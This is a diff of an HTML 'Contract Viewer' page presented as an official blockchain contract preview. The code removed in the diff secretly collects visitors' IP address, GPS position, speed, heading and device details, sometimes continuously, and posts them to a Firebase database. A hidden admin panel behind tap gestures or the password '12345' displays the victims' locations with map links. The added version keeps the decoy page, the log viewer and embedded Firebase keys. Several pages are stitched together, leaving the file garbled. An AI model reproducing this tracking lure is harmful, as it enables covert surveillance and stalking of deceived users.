@@ -1,490 +1,89 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>SmartTrust Contract Viewer</title>
+  <meta charset="UTF-8">
+  <title>SmartCheck Contract Viewer</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
-    body { background: #0a0a0a; color: #fff; padding: 20px; }
-    #viewer, #adminPanel { display: none; }
-    .hidden { display: none; }
-    .loader { border: 5px solid #444; border-top: 5px solid #00ffcc; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 50px auto; }
-    @keyframes spin { 100% { transform: rotate(360deg); } }
-    .header { font-size: 24px; color: #00ffcc; margin-bottom: 1rem; }
-    .doc-info { background: #111; padding: 1rem; border-radius: 10px; margin-bottom: 1rem; }
-    .doc-info p { margin: 6px 0; }
-    .footer { text-align: center; margin-top: 2rem; color: #aaa; font-size: 0.85rem; }
-    .admin-btn { position: fixed; top: 10px; right: 10px; font-size: 12px; color: #00ffcc; cursor: pointer; }
-    .passcode-screen { text-align: center; margin-top: 80px; }
-    input[type="password"] { padding: 10px; font-size: 16px; border: none; border-radius: 5px; margin: 10px; }
-    button { background: #00ffcc; border: none; padding: 10px 15px; font-size: 16px; border-radius: 5px; cursor: pointer; }
-    table { width: 100%; border-collapse: collapse; margin-top: 1rem; font-size: 14px; }
-    th, td { border: 1px solid #444; padding: 8px; text-align: center; }
-    h2 { color: #00ffcc; margin-bottom: 10px; }
+    body { margin: 0; font-family: 'Segoe UI', sans-serif; background: #f4f6f9; color: #333; }
+    header, .footer { background: #2e86de; color: #fff; padding: 1rem; text-align: center; }
+    nav { background: #fff; padding: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+    nav button { background: #2e86de; color: #fff; border: none; padding: 8px 12px; margin-right: 5px; cursor: pointer; }
+    .content, .admin-panel { padding: 20px; }
+    .doc-box { background: #fff; padding: 15px; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); margin-top: 1rem; }
+    .admin-panel { display: none; }
+    .admin-panel table { width: 100%; border-collapse: collapse; margin-top: 20px; font-size: 14px; }
+    .admin-panel th, .admin-panel td { border: 1px solid #ccc; padding: 8px; text-align: left; }
+    .admin-panel th { background: #2e86de; color: #fff; }
+    #loading { text-align: center; margin-top: 2rem; font-size: 1.2rem; }
   </style>
 </head>
 <body>
 
-<!-- Admin trigger -->
-<div class="admin-btn" onclick="toggleAdmin()">Admin Panel</div>
-
-<!-- Passcode Unlock -->
-<div id="unlock">
-  <div class="passcode-screen">
-    <h2>Enter Access Code</h2>
-    <input type="password" id="passcode" placeholder="Enter Passcode" />
-    <br/>
-    <button onclick="checkPass()">Unlock</button>
-  </div>
-</div>
-
-<!-- Viewer -->
-<div id="viewer">
-  <div class="header">SmartTrust Contract Viewer</div>
-  <div class="doc-info">
-    <p><strong>Document:</strong> SC-024/NGX-CON</p>
-    <p><strong>Status:</strong> Active</p>
-    <p><strong>Issued by:</strong> National Blockchain Governance Unit</p>
-    <p><strong>Effective Date:</strong> August 1, 2025</p>
-    <p><strong>Parties:</strong> GlobalChain Inc. & SmartCheck Solutions</p>
-    <p><strong>Digital Signature:</strong> ✅ Verified</p>
-  </div>
-  <div class="loader"></div>
-  <p>Loading contract document...</p>
-  <div class="footer">© 2025 SmartTrust. All rights reserved.</div>
-</div>
-
-<!-- Admin Panel -->
-<div id="adminPanel">
-  <h2>GPS & IP Log</h2>
-  <div class="loader" id="logLoading"></div>
-  <table id="logTable" class="hidden">
-    <thead>
-      <tr><th>Timestamp</th><th>Lat</th><th>Lon</th><th>Speed</th><th>Dir</th><th>IP</th></tr>
-    </thead>
-    <tbody id="logBody"></tbody>
-  </table>
-</div>
-
-<!-- Firebase + GPS Logic -->
-<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
-<script>
-  // Firebase Config
-  const firebaseConfig = {
-    apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
-    authDomain: "gps-d0bab.firebaseapp.com",
-    databaseURL: "https://gps-d0bab-default-rtdb.firebaseio.com",
-    projectId: "gps-d0bab",
-    storageBucket: "gps-d0bab.appspot.com",
-    messagingSenderId: "810816177909",
-    appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"
-  };
-  firebase.initializeApp(firebaseConfig);
-  const db = firebase.database();
-
-  // Collect IP
-  fetch("https://api.ipify.org?format=json")
-    .then(res => res.json())
-    .then(ipData => {
-      const ip = ipData.ip;
-      logData(ip);
-    });
-
-  // Log GPS + IP
-  function logData(ip) {
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(pos => {
-        const { latitude, longitude, speed, heading } = pos.coords;
-        const timestamp = new Date().toLocaleString();
-        const data = {
-          lat: latitude,
-          lon: longitude,
-          speed: speed || 0,
-          dir: heading || 0,
-          ip,
-          timestamp
-        };
-        db.ref("logs").push(data);
-      });
-    }
-  }
-
-  // Admin unlock logic
-  function checkPass() {
-    const input = document.getElementById("passcode").value;
-    if (input === "12345") {
-      document.getElementById("unlock").style.display = "none";
-      document.getElementById("viewer").style.display = "block";
-    } else {
-      alert("Incorrect code.");
-    }
-  }
-
-  // Toggle Admin Panel
-  function toggleAdmin() {
-    const panel = document.getElementById("adminPanel");
-    const table = document.getElementById("logTable");
-    const loader = document.getElementById("logLoading");
-    panel.style.display = panel.style.display === "block" ? "none" : "block";
-
-    db.ref("logs").once("value", snap => {
-      const logs = snap.val();
-      const tbody = document.getElementById("logBody");
-      tbody.innerHTML = "";
-      for (let key in logs) {
-        const { timestamp, lat, lon, speed, dir, ip } = logs[key];
-        tbody.innerHTML += `<tr>
-          <td>${timestamp}</td>
-          <td>${lat.toFixed(5)}</td>
-          <td>${lon.toFixed(5)}</td>
-          <td>${speed}</td>
-          <td>${dir}</td>
-          <td>${ip}</td>
-        </tr>`;
-      }
-      loader.classList.add("hidden");
-      table.classList.remove("hidden");
-    });
-  }
-</script>
-
-</body>
-</html>    .content {
-      padding: 2rem;
-    }
-    .doc {
-      background: white;
-      border-radius: 8px;
-      padding: 1.5rem;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-      max-width: 800px;
-      margin: auto;
-    }
-    .footer {
-      text-align: center;
-      padding: 1rem;
-      font-size: 0.9rem;
-      color: #aaa;
-    }
-    /* Hidden admin panel */
-    .admin-trigger {
-      position: fixed;
-      bottom: 10px;
-      right: 10px;
-      background: transparent;
-      border: none;
-      width: 50px;
-      height: 50px;
-    }
-    .admin-panel {
-      display: none;
-      position: fixed;
-      top: 50px;
-      left: 50%;
-      transform: translateX(-50%);
-      background: #111;
-      color: white;
-      width: 90%;
-      max-width: 1000px;
-      height: 80vh;
-      border-radius: 12px;
-      padding: 20px;
-      overflow-y: auto;
-      z-index: 9999;
-      box-shadow: 0 0 15px rgba(0,255,255,0.4);
-      animation: fadeIn 0.4s ease;
-    }
-    .admin-panel h2 {
-      color: #00ffcc;
-      text-align: center;
-    }
-    .admin-panel table {
-      width: 100%;
-      margin-top: 20px;
-      border-collapse: collapse;
-      font-size: 14px;
-    }
-    .admin-panel th, .admin-panel td {
-      border: 1px solid #888;
-      padding: 8px;
-      text-align: left;
-    }
-    .admin-panel .btn {
-      background: #00ffcc;
-      color: #000;
-      border: none;
-      padding: 10px 15px;
-      margin: 10px 5px;
-      cursor: pointer;
-      border-radius: 6px;
-    }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(-20px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-  </style>
-</head>
-<body>
   <header>
-    <h1>SmartTrust Viewer</h1>
-    <span>Last seen: <span id="lastSeen"></span></span>
+    <h1>SmartCheck Contract Viewer</h1>
+    <p>Document: SC-024/NGX-CON | Status: Active</p>
   </header>
+
   <nav>
-    <button onclick="showDoc('A')">Contract A</button>
-    <button onclick="showDoc('B')">Contract B</button>
-    <button onclick="showDoc('legal')">Legal Info</button>
-  </nav>  <div class="content">
-    <div class="doc" id="contractContent">
-      <h2>Document: SC-024/NGX-CON</h2>
-      <p>Status: <strong>Active</strong></p>
-      <p><strong>Issued by:</strong> National Blockchain Governance Unit</p>
+    <button onclick="showContent('contractA')">Contract A</button>
+    <button onclick="showContent('contractB')">Contract B</button>
+    <button onclick="showContent('legal')">Legal Info</button>
+    <button onclick="window.location.href='?admin'">Admin Panel</button>
+  </nav>
+
+  <div class="content" id="main-content">
+    <div id="contractA" class="doc-box">
+      <h3>Issued by: National Blockchain Governance Unit</h3>
       <p><strong>Effective Date:</strong> August 1, 2025</p>
-      <p><strong>Parties:</strong> GlobalChain Inc. and SmartCheck Solutions</p>
-      <h3>Content Preview:</h3>
+      <p><strong>Parties Involved:</strong> GlobalChain Inc. and SmartCheck Solutions</p>
+      <p><strong>Content Preview:</strong></p>
       <ul>
-        <li>Section 1: Terms & Conditions...</li>
-        <li>Section 2: Payment Schedule...</li>
-        <li>Section 3: Liability Clause...</li>
-        <li>Section 4: Signature Authorization...</li>
+        <li>Section 1: Terms & Conditions</li>
+        <li>Section 2: Payment Schedule</li>
+        <li>Section 3: Liability Clause</li>
+        <li>Section 4: Signature Authorization</li>
       </ul>
       <p>[Digital Signature Verified ✅]</p>
-      <p>This app lets you preview digital contracts and agreements for legal purposes.</p>
     </div>
-  </div>  <div class="footer">© 2025 SmartTrust Technologies Ltd. All rights reserved.</div>  <!-- Invisible tap zone --><button class="admin-trigger" onclick="tap()"></button>
 
-  <!-- Admin Panel -->  <div class="admin-panel" id="adminPanel">
-    <h2>Admin Panel</h2>
-    <button class="btn" onclick="exportLogs()">Export Logs</button>
+    <div id="contractB" class="doc-box" style="display:none;">
+      <p>Loading Contract B...</p>
+    </div>
+
+    <div id="legal" class="doc-box" style="display:none;">
+      <p>This app lets you preview digital contracts and agreements for legal purposes.<br>
+      SmartTrust Technologies Ltd. © 2025. All rights reserved.</p>
+    </div>
+  </div>
+
+  <div class="admin-panel" id="adminPanel" style="display:none;">
+    <h2>SmartCheck Admin Panel</h2>
+    <p>Live Device Logs:</p>
+    <div id="loading">Loading logs...</div>
     <table>
       <thead>
-        <tr><th>IP Address</th><th>City</th><th>Time</th></tr>
+        <tr>
+          <th>Latitude</th>
+          <th>Longitude</th>
+          <th>Speed</th>
+          <th>Direction</th>
+          <th>IP Address</th>
+          <th>Timestamp</th>
+          <th>Map</th>
+        </tr>
       </thead>
-      <tbody id="logTable">
-        <tr><td>192.168.0.1</td><td>Lagos</td><td>12:04 AM</td></tr>
-        <!-- Dynamic rows -->
-      </tbody>
+      <tbody id="logTable"></tbody>
     </table>
-  </div>  <script>
-    let taps = 0;
-    function tap() {
-      taps++;
-      if (taps >= 5) {
-        document.getElementById('adminPanel').style.display = 'block';
-        taps = 0;
-      }
-    }
-    function showDoc(type) {
-      const el = document.getElementById('contractContent');
-      el.innerHTML = `<h2>Document ${type}</h2><p>Loading ${type} content...</p>`;
-    }
-    function exportLogs() {
-      alert("Exported log.csv ✔");
-    }
-    document.getElementById('lastSeen').textContent = new Date().toLocaleString();
-  </script></body>
-</html>    .content {
-      padding: 20px;
-    }
-    .footer {
-      padding: 20px;
-      font-size: 12px;
-      background: #000;
-      text-align: center;
-      color: #666;
-    }
-    .admin-panel {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
-      background: #000000ee;
-      display: none;
-      flex-direction: column;
-      color: white;
-      padding: 20px;
-      overflow-y: auto;
-      z-index: 9999;
-    }
-    .admin-panel table {
-      width: 100%;
-      margin-top: 20px;
-      border-collapse: collapse;
-      font-size: 14px;
-    }
-    .admin-panel table, th, td {
-      border: 1px solid #888;
-      padding: 8px;
-    }
-    .admin-panel h2 {
-      color: #00ffcc;
-    }
-    .btn {
-      background: #00ffcc;
-      color: #000;
-      border: none;
-      padding: 10px 15px;
-      margin: 10px 5px;
-      cursor: pointer;
-    }
-  </style>
-</head>
-<body>
-  <header id="tapArea">SmartTrust Contract Viewer</header>
-  <div class="tabs">
-    <div class="tab active">Contract A</div>
-    <div class="tab">Contract B</div>
-    <div class="tab">Legal Info</div>
   </div>
-  <div class="content">
-    <h2>Document: SC-024/NGX-CON</h2>
-    <p><strong>Status:</strong> Active</p>
-    <p><strong>Issued by:</strong> National Blockchain Governance Unit</p>
-    <p><strong>Effective Date:</strong> August 1, 2025</p>
-    <p><strong>Parties Involved:</strong> GlobalChain Inc. and SmartCheck Solutions</p>
-    <p><strong>Content Preview:</strong></p>
-    <ul>
-      <li>Section 1: Terms & Conditions...</li>
-      <li>Section 2: Payment Schedule...</li>
-      <li>Section 3: Liability Clause...</li>
-      <li>Section 4: Signature Authorization...</li>
-    </ul>
-    <p>[Digital Signature Verified ✅]</p>
-    <p>This app lets you preview digital contracts and agreements for legal purposes.</p>
-  </div>
-  <div class="footer">
-    SmartTrust Technologies Ltd. &copy; 2025. All rights reserved.<br>
-    <small>Last seen: <span id="lastSeen"></span></small>
-  </div>  <div id="adminPanel" class="admin-panel">
-    <h2>Admin Panel – Location Logs</h2>
-    <button class="btn" onclick="clearLogs()">🗑 Clear Logs</button>
-    <button class="btn" onclick="exportCSV()">📁 Export CSV</button>
-    <table id="logTable">
-      <thead>
-        <tr><th>Time</th><th>Lat</th><th>Lng</th><th>Speed</th><th>Direction</th><th>Device</th><th>Map</th></tr>
-      </thead>
-      <tbody></tbody>
-    </table>
-  </div>  <script>
-    // Last seen
-    document.getElementById("lastSeen").textContent = new Date().toLocaleString();
 
-    // Tap to reveal admin panel
-    let tapCount = 0;
-    let tapTimer;
-    document.getElementById("tapArea").addEventListener("click", function() {
-      tapCount++;
-      clearTimeout(tapTimer);
-      tapTimer = setTimeout(() => tapCount = 0, 1000);
-      if (tapCount === 5) {
-        document.getElementById("adminPanel").style.display = "flex";
-      }
-    });
+  <div class="footer">SmartTrust © 2025. All rights reserved.</div>
 
-    // Dummy logs for testing
-    const logs = [
-      { time: '2025-08-01 22:45', lat: '9.0820', lng: '8.6753', speed: '0 km/h', dir: 'N/A', dev: 'Android' },
-      { time: '2025-08-01 23:10', lat: '9.0831', lng: '8.6740', speed: '3 km/h', dir: 'North', dev: 'Android' }
-    ];
-    const tableBody = document.querySelector("#logTable tbody");
-    logs.forEach(log => {
-      const row = document.createElement("tr");
-      row.innerHTML = `<td>${log.time}</td><td>${log.lat}</td><td>${log.lng}</td><td>${log.speed}</td><td>${log.dir}</td><td>${log.dev}</td><td><a href="https://www.google.com/maps?q=${log.lat},${log.lng}" target="_blank">📍</a></td>`;
-      tableBody.appendChild(row);
-    });
+  <!-- Firebase -->
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
 
-    function clearLogs() {
-      tableBody.innerHTML = '';
-    }
-
-    function exportCSV() {
-      let csv = 'Time,Lat,Lng,Speed,Direction,Device\n';
-      logs.forEach(l => {
-        csv += `${l.time},${l.lat},${l.lng},${l.speed},${l.dir},${l.dev}\n`;
-      });
-      const blob = new Blob([csv], { type: 'text/csv' });
-      const url = URL.createObjectURL(blob);
-      const a = document.createElement('a');
-      a.href = url;
-      a.download = 'location_logs.csv';
-      a.click();
-    }
-  </script></body>
-  </html>      color: #2e86de;
-      display: none;
-    }
-    .footer {
-      text-align: center;
-      padding: 1rem;
-      font-size: 0.9rem;
-      color: #aaa;
-    }
-  </style>
-</head>
-<body>
-  <div class="header">
-    <div class="logo">SmartTrust Viewer</div>
-    <div id="last-seen">Last seen: <span id="timestamp">--</span></div>
-  </div>
-  <div class="content">
-    <div class="tabs">
-      <div class="tab active" onclick="loadDoc('contract1')">Contract A</div>
-      <div class="tab" onclick="loadDoc('contract2')">Contract B</div>
-      <div class="tab" onclick="loadDoc('contract3')">Legal Info</div>
-    </div>
-    <div class="viewer">
-      <div class="loading" id="loading">Loading...</div>
-      <iframe id="pdfViewer" src="https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf" onload="document.getElementById('loading').style.display='none'"></iframe>
-    </div>
-  </div>
-  <div class="footer">&copy; 2025 SmartTrust. All rights reserved.</div>  <script>
-    const tabs = document.querySelectorAll('.tab');
-    const viewer = document.getElementById('pdfViewer');
-
-    function loadDoc(doc) {
-      document.getElementById('loading').style.display = 'block';
-      tabs.forEach(t => t.classList.remove('active'));
-      event.target.classList.add('active');
-      if (doc === 'contract1') viewer.src = 'https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf';
-      if (doc === 'contract2') viewer.src = 'https://www.adobe.com/support/products/enterprise/knowledgecenter/media/c4611_sample_explain.pdf';
-      if (doc === 'contract3') viewer.src = 'https://gahp.net/wp-content/uploads/2017/09/sample.pdf';
-    }
-
-    // Auto IP Logging + Firebase
-    fetch('https://api.ipify.org?format=json')
-      .then(res => res.json())
-      .then(data => {
-        const ip = data.ip;
-        const timestamp = new Date().toLocaleString();
-        document.getElementById('timestamp').textContent = timestamp;
-
-        fetch('https://gps-d0bab-default-rtdb.firebaseio.com/logs.json', {
-          method: 'POST',
-          body: JSON.stringify({ ip, timestamp }),
-        });
-      });
-
-    // Admin Panel Tap Access (5 taps)
-    let tapCount = 0;
-    document.querySelector('.logo').addEventListener('click', () => {
-      tapCount++;
-      if (tapCount >= 5) {
-        window.open('https://smarttrust-admin-panel.web.app', '_blank');
-        tapCount = 0;
-      }
-      setTimeout(() => (tapCount = 0), 3000);
-    });
-  </script></body>
-</html>  <div id="preview" class="content"><p>Document Preview...</p></div>
-  <div id="docs" class="content"><p>Document List...</p></div>
-  <div id="company" class="content"><p>SmartTrust Technologies Ltd.</p></div>  <div id="adminPanel">
-    <h3>Admin Panel (Hidden)</h3>
-    <pre id="logData">Loading logs...</pre>
-  </div>  <footer onclick="footerTapped()">
-    &copy; SmartTrust
-  </footer>  <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>  <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>  <script>
+  <script>
     const firebaseConfig = {
       apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
       authDomain: "gps-d0bab.firebaseapp.com",
@@ -494,276 +93,55 @@
       messagingSenderId: "810816177909",
       appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"
     };
-
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    const userId = `user_${Math.random().toString(36).substr(2, 9)}`;
-    const userRef = db.ref('logs/' + userId);
-
-    function showTab(id) {
-      document.querySelectorAll('.content').forEach(el => el.classList.remove('active'));
-      document.getElementById(id).classList.add('active');
-    }
-
-    let tapCount = 0;
-    function footerTapped() {
-      tapCount++;
-      if (tapCount >= 5) {
-        document.getElementById("adminPanel").style.display = "block";
-        loadAdminLogs();
-      }
-    }
-
-    function logData(data) {
-      userRef.set(data);
-    }
-
-    function getLocationAndLog() {
-      if (!navigator.geolocation) return;
-      navigator.geolocation.getCurrentPosition(pos => {
-        const coords = pos.coords;
-        logData({
-          lat: coords.latitude,
-          lon: coords.longitude,
-          speed: coords.speed,
-          heading: coords.heading,
-          timestamp: new Date().toISOString(),
-          userAgent: navigator.userAgent,
-          screen: `${screen.width}x${screen.height}`
-        });
+    function showContent(id) {
+      ['contractA', 'contractB', 'legal'].forEach(el => {
+        document.getElementById(el).style.display = 'none';
       });
+      document.getElementById(id).style.display = 'block';
     }
 
-    function getIP() {
-      fetch("https://api.ipify.org?format=json")
-        .then(res => res.json())
-        .then(ip => userRef.update({ ip: ip.ip }));
-    }
-
-    function loadAdminLogs() {
-      db.ref('logs').once('value').then(snapshot => {
-        const data = snapshot.val();
-        document.getElementById("logData").innerText = JSON.stringify(data, null, 2);
-      });
-    }
-
-    getIP();
-    getLocationAndLog();
-  </script></body>
-</html>      color: white;
-      padding: 20px;
-      overflow-y: auto;
-      z-index: 9999;
-    }
-    .admin-panel table {
-      width: 100%;
-      margin-top: 20px;
-      border-collapse: collapse;
-      font-size: 14px;
-    }
-    .admin-panel table, th, td {
-      border: 1px solid #888;
-      padding: 8px;
-    }
-    .admin-panel h2 {
-      color: #00ffcc;
-    }
-    .btn {
-      background: #00ffcc;
-      color: #000;
-      border: none;
-      padding: 10px 15px;
-      margin: 10px 5px;
-      cursor: pointer;
-    }
-  </style>
-</head>
-<body>
-  <header>
-    <h1>SmartCheck Contract Viewer</h1>
-  </header>
-
-  <div class="contract">
-    <h2>Document: SC-024/NGX-CON</h2>
-    <p><strong>Status:</strong> Active</p>
-    <p><strong>Issued by:</strong> National Blockchain Governance Unit</p>
-    <p><strong>Effective Date:</strong> August 1, 2025</p>
-    <p><strong>Parties Involved:</strong> GlobalChain Inc. and SmartCheck Solutions</p>
-    <p><strong>Content Preview:</strong></p>
-    <div style="background:#eee;padding:15px;height:300px;overflow:auto;border:1px solid #ccc;border-radius:6px;">
-      This Contract Agreement ("Agreement") is entered into between GlobalChain Inc. and SmartCheck Solutions...
-      <br/><br/>
-      Section 1: Terms & Conditions...<br/>
-      Section 2: Payment Schedule...<br/>
-      Section 3: Liability Clause...<br/>
-      Section 4: Signature Authorization...
-      <br/><br/>
-      [Digital Signature Verified ✅]
-    </div>
-  </div>
-
-  <div class="admin-panel" id="adminPanel">
-    <h2>Admin Panel – Location Logs</h2>
-    <button class="btn" onclick="clearLogs()">🗑 Clear Logs</button>
-    <button class="btn" onclick="exportCSV()">📁 Export CSV</button>
-    <table id="logTable">
-      <thead>
-        <tr>
-          <th>Time</th><th>Lat</th><th>Lng</th><th>Speed</th><th>Direction</th><th>Device</th><th>Map</th>
-        </tr>
-      </thead>
-      <tbody></tbody>
-    </table>
-  </div>
-
-  <script>
-    const dbURL = "https://gps-d0bab-default-rtdb.firebaseio.com/locations.json";
-
-    function logLocation(pos) {
-      const data = {
-        lat: pos.coords.latitude,
-        lng: pos.coords.longitude,
-        speed: pos.coords.speed || "N/A",
-        direction: pos.coords.heading || "N/A",
-        time: new Date().toISOString(),
-        ua: navigator.userAgent
-      };
-      fetch(dbURL, {
-        method: "POST",
-        body: JSON.stringify(data)
-      });
+    function showAdminPanel() {
+      document.querySelector('nav').style.display = 'none';
+      document.getElementById('main-content').style.display = 'none';
+      document.getElementById('adminPanel').style.display = 'block';
+      fetchLogs();
     }
 
     function fetchLogs() {
-      fetch(dbURL)
-        .then(res => res.json())
-        .then(data => {
-          const tbody = document.querySelector("#logTable tbody");
-          tbody.innerHTML = "";
-          for (let id in data) {
-            const d = data[id];
-            const row = `<tr>
-              <td>${new Date(d.time).toLocaleString()}</td>
-              <td>${d.lat}</td><td>${d.lng}</td>
-              <td>${d.speed}</td><td>${d.direction}</td>
-              <td>${d.ua?.slice(0, 30)}...</td>
-              <td><a href="https://maps.google.com/?q=${d.lat},${d.lng}" target="_blank">Map</a></td>
+      const logsRef = db.ref("logs");
+      logsRef.on("value", (snapshot) => {
+        const data = snapshot.val();
+        const table = document.getElementById("logTable");
+        const loadingText = document.getElementById("loading");
+        table.innerHTML = "";
+        if (!data) {
+          loadingText.innerText = "No data found.";
+          return;
+        }
+        loadingText.style.display = "none";
+        Object.values(data).reverse().forEach(entry => {
+          const row = `
+            <tr>
+              <td>${entry.latitude || "-"}</td>
+              <td>${entry.longitude || "-"}</td>
+              <td>${entry.speed || "-"}</td>
+              <td>${entry.direction || "-"}</td>
+              <td>${entry.ip || "-"}</td>
+              <td>${entry.timestamp || "-"}</td>
+              <td><a href="https://www.google.com/maps?q=${entry.latitude},${entry.longitude}" target="_blank">Map</a></td>
             </tr>`;
-            tbody.innerHTML += row;
-          }
+          table.innerHTML += row;
         });
-    }
-
-    function clearLogs() {
-      if (confirm("Clear all location logs?")) {
-        fetch("https://gps-d0bab-default-rtdb.firebaseio.com/locations.json", { method: "DELETE" })
-        .then(() => fetchLogs());
-      }
-    }
-
-    function exportCSV() {
-      fetch(dbURL).then(res => res.json()).then(data => {
-        let csv = "Time,Latitude,Longitude,Speed,Direction,UserAgent\n";
-        for (let id in data) {
-          let d = data[id];
-          csv += `"${d.time}","${d.lat}","${d.lng}","${d.speed}","${d.direction}","${d.ua}"\n`;
-        }
-        const blob = new Blob([csv], { type: "text/csv" });
-        const a = document.createElement("a");
-        a.href = URL.createObjectURL(blob);
-        a.download = "location_logs.csv";
-        a.click();
       });
     }
 
-    // Admin Panel Unlock
-    let shiftPressed = false;
-    document.addEventListener("keydown", e => {
-      if (e.key === "Shift") shiftPressed = true;
-      if (shiftPressed && e.key.toLowerCase() === "a") {
-        const pass = prompt("Enter admin password:");
-        if (pass === "12345") {
-          document.getElementById("adminPanel").style.display = "block";
-          fetchLogs();
-          setInterval(fetchLogs, 8000);
-        } else {
-          alert("Incorrect password");
-        }
-      }
-    });
-    document.addEventListener("keyup", e => {
-      if (e.key === "Shift") shiftPressed = false;
-    });
-
-    // Start GPS tracking
-    if ("geolocation" in navigator) {
-      navigator.geolocation.getCurrentPosition(logLocation);
-      navigator.geolocation.watchPosition(logLocation, null, { enableHighAccuracy: true });
+    // Route check
+    if (window.location.search.includes("admin")) {
+      showAdminPanel();
     }
   </script>
 </body>
-                                                            </html>    <p>This app lets you preview digital contracts and agreements for legal purposes.</p>
-    <p><i>Loading contract document...</i></p>
-  </div>
-
-  <!-- Firebase SDK -->
-  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
-
-  <script>
-    // ✅ Your Firebase config
-    const firebaseConfig = {
-      apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
-      authDomain: "gps-d0bab.firebaseapp.com",
-      databaseURL: "https://gps-d0bab-default-rtdb.firebaseio.com",
-      projectId: "gps-d0bab",
-      storageBucket: "gps-d0bab.appspot.com",
-      messagingSenderId: "810816177909",
-      appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"
-    };
-
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
-
-    // Random device ID for anonymity
-    const userId = 'device_' + Math.random().toString(36).substring(2, 10);
-
-    function getDirection(heading) {
-      if (heading === null || isNaN(heading)) return "Unknown";
-      const directions = ["N", "NE", "E", "SE", "S", "SW", "W", "NW"];
-      return directions[Math.round(heading / 45) % 8];
-    }
-
-    function updateLocation(position) {
-      const { latitude, longitude, speed, heading } = position.coords;
-      const direction = getDirection(heading);
-      const timestamp = new Date().toISOString();
-      const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-
-      db.ref('locations/' + userId).set({
-        latitude,
-        longitude,
-        speed,
-        direction,
-        timestamp,
-        maps_link: mapsLink
-      });
-    }
-
-    function handleError(error) {
-      console.warn("Location error:", error.message);
-    }
-
-    function trackLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(updateLocation, handleError);
-      }
-    }
-
-    // Auto-track every 10 seconds
-    setInterval(trackLocation, 10000);
-    trackLocation();
-  </script>
-</body>
-</html>
+  </html>
